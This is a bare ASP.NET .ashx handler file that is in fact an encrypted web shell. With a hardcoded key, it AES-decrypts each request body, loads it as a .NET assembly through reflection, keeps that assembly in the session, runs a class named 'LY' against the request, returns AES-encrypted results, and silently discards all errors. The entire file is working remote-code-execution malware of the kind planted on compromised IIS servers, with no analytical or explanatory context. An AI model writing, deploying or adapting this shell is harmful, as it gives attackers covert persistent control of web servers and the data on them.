<%@  Language="C#" Class="Handler1" %>
    public class Handler1 : System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState
    {

        public void ProcessRequest(System.Web.HttpContext Context)
        {
			try{string key = "3c6e0b8a9c15224a";byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(Context.Request.BinaryRead(Context.Request.ContentLength), 0, Context.Request.ContentLength);if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(data);byte[] r = System.Convert.FromBase64String(o.ToString());Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){}
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
    }